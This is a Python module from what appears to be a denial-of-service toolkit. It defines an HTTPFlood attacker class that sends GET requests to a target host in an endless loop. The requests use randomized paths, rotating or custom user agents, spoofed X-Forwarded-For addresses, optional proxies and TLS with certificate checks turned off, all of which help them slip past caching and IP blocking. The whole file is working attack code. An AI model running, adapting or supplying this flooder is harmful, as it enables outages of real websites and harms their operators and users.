import socket
import random
import time
import ssl

from .base import BaseAttacker

class HTTPFlood(BaseAttacker):
    def __init__(self, args, config, stats, running, worker_id):
        super().__init__(args, config, stats, running, worker_id)
        self.http_config = config.get('http', {})
        self.user_agents = config.get('user_agents', [])
        self.custom_ua = getattr(args, 'user_agent', None)
        self.proxies = []
        if getattr(args, 'proxy_file', None):
            with open(args.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        self._sock = None
        self._requests_on_sock = 0

    def _rand_str(self, length):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))

    def _random_path(self):
        paths = [
            f"/{self._rand_str(8)}?{self._rand_str(6)}={self._rand_str(10)}",
            f"/{self._rand_str(5)}/{self._rand_str(8)}",
            f"/search?q={self._rand_str(12)}",
            f"/api/v1/{self._rand_str(6)}",
            f"/wp-content/{self._rand_str(10)}.php",
        ]
        return random.choice(paths)

    def _build_request(self):
        path = self._random_path() if self.http_config.get('randomize_path', True) else "/"
        if self.custom_ua:
            ua = self.custom_ua
        elif self.user_agents:
            ua = random.choice(self.user_agents)
        else:
            ua = "TINUBULUX/1.0"

        req = f"GET {path} HTTP/1.1\r\n"
        req += f"Host: {self.target}\r\n"
        req += f"User-Agent: {ua}\r\n"
        req += "Accept: */*\r\n"
        req += "Accept-Language: en-US,en;q=0.9\r\n"
        req += "Accept-Encoding: gzip, deflate\r\n"
        req += "Connection: keep-alive\r\n"
        req += "Cache-Control: no-cache\r\n"
        req += f"X-Forwarded-For: {self.random_ip()}\r\n"
        req += f"X-Request-ID: {self._rand_str(16)}\r\n"
        req += "\r\n"
        return req.encode()

    def _get_socket(self):
        """Return a live keep-alive socket, reconnecting if needed."""
        if self._sock is not None:
            return self._sock
        timeout = self.http_config.get('timeout', 5)
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(timeout)
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self._sock = context.wrap_socket(raw, server_hostname=self.target)
            else:
                self._sock = raw
            self._sock.connect((self.target, self.port))
            self._requests_on_sock = 0
            return self._sock
        except Exception:
            self._close_socket()
            return None

    def _close_socket(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
        self._sock = None

    def attack(self):
        max_requests = self.http_config.get('max_requests_per_conn', 100)
        keep_alive = self.http_config.get('keep_alive', True)

        try:
            while self.running.value:
                try:
                    sock = self._get_socket()
                    if not sock:
                        self._count(failed=1)
                        time.sleep(0.01)
                        continue

                    request = self._build_request()
                    sock.sendall(request)
                    self._count(sent=1, size=len(request))
                    self._requests_on_sock += 1

                    if keep_alive:
                        try:
                            sock.settimeout(0.5)
                            sock.recv(4096)
                            sock.settimeout(self.http_config.get('timeout', 5))
                        except socket.timeout:
                            pass
                        except Exception:
                            self._close_socket()

                    if not keep_alive or self._requests_on_sock >= max_requests:
                        self._close_socket()

                except Exception:
                    self._close_socket()
                    self._count(failed=1)
                    time.sleep(0.01)
                self._pace()
        finally:
            self._close_socket()
            self.finalize()